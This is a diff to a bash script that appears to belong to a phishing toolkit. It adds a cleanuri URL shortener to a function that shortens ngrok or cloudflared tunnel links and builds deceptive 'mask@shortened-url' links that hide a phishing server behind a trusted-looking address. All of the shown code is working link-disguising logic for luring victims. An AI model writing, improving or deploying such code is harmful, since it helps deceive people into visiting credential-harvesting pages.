@@ -1,6 +1,6 @@
 #!/bin/bash
 
-__version__="1.0"
+__version__="1.5"
 
 ## DEFAULT HOST & PORT 
 HOST='127.0.0.1'
@@ -327,22 +327,31 @@ shorteny() {
 	fi
 }
 
+## cleanuri for cleanuri
+Cleanuri() {
+	short=$(curl -s -X POST -d "url=$2" "$1" | jq -r '.result_url')
+	processed_url=${short#http*//}
+}
+
 custom_url() {
 	url=${1#http*//}
+	cleanuri="https://cleanuri.com/api/v1/shorten"
 	isgd="https://www.is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
+		if [[ $(curl -i -s -X POST -d "url=https://example.com" https://cleanuri.com/api/v1/shorten | grep -i 'HTTP/' | awk '{print $2}') == 2* ]]; then
+			Cleanuri $cleanuri "https://$url"
+		elif [[ $(site_stat $isgd) == 2* ]]; then
 			shorteny $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
 			shorten $shortcode "$url"
 		else
 			shorten $tinyurl "$url"
 		fi
-		
+
 		url="https://$url"
 		masked_url="$mask@$processed_url"
 		processed_url="https://$processed_url"
@@ -351,11 +360,11 @@ custom_url() {
 		url="Unable to generate links. Try after turning on hotspot"
 		processed_url="Unable to Short URL"
 	fi
-	
+
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
-	echo 
+	echo
 	if pidof cloudflared > /dev/null; then
         	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Your server is running...${BLUE}Ctrl + C ${ORANGE}to exit.\n"
     	else
